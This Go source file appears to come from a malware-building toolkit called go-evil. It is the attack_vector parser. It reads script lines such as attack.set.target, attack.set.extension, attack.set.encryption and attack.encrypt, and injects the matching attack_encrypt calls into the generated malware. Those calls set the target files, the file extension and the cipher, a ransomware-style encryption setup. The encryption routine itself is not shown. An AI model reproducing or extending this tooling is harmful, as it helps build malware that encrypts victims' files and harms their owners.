package attack_vector

import (
	"regexp"

	attack_hash "github.com/s9rA16Bf4/go-evil/domains/attack_vector/hash/private"

	mal "github.com/s9rA16Bf4/go-evil/domains/malware/private"
	"github.com/s9rA16Bf4/go-evil/utility/io"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

const (
	EXTRACT_SUBDOMAIN      = "(attack)\\.(.+)\\.(.+)\\(.*\\);" // Captures subdomain and function
	EXTRACT_FUNCTION_VALUE = ".+\\(\"(.*)\"\\);"               // Grabs the value being passed to the function
	EXTRACT_FUNCTION       = "(attack)\\.(.+)\\(.*\\);"        // This is for the cases when we don't have a subdomain
)

func Parse(new_line string) {
	regex := regexp.MustCompile(EXTRACT_FUNCTION_VALUE)
	result := regex.FindAllStringSubmatch(new_line, -1)
	var value string
	if len(result) > 0 {
		value = result[0][1]
	} else {
		value = "NULL"
	}
	regex = regexp.MustCompile(EXTRACT_SUBDOMAIN)
	result = regex.FindAllStringSubmatch(new_line, -1)

	if len(result) > 0 { // There is a subdomain to extract
		subdomain := result[0][2]
		function := result[0][3]

		switch subdomain {
		case "set":
			switch function {
			case "hash":
				attack_hash.Set_hash(value)
			case "extension":
				io.Append_domain("attack_encrypt")
				mal.AddContent("attack_encrypt.SetExtension(\"" + value + "\")")
			case "target":
				io.Append_domain("attack_encrypt")
				mal.AddContent("attack_encrypt.SetTarget(\"" + value + "\")")
			case "encryption":
				io.Append_domain("attack_encrypt")
				mal.AddContent("attack_encrypt.SetEncryptionMethod(\"" + value + "\")")

			default:
				function_error(function)
			}
		default:
			subdomain_error(subdomain)
		}
	} else { // There might be a function which doesn't require a subdomain to work
		regex = regexp.MustCompile(EXTRACT_FUNCTION)
		result = regex.FindAllStringSubmatch(new_line, -1)
		if len(result) > 0 {
			function := result[0][2]

			switch function {
			case "hash":
				attack_hash.Hash(value)
			case "encrypt":
				io.Append_domain("attack_encrypt")
				mal.AddContent("attack_encrypt.Encrypt()")
			case "decrypt":
				io.Append_domain("attack_encrypt")
				mal.AddContent("attack_encrypt.Decrypt()")
			default:
				function_error(function)
			}
		}
	}
}
func subdomain_error(subdomain string) {
	notify.Error("Unknown subdomain '"+subdomain+"'", "attack_vector.Parse()")
}
func function_error(function string) {
	notify.Error("Unknown function '"+function+"'", "attack_vector.Parse()")
}
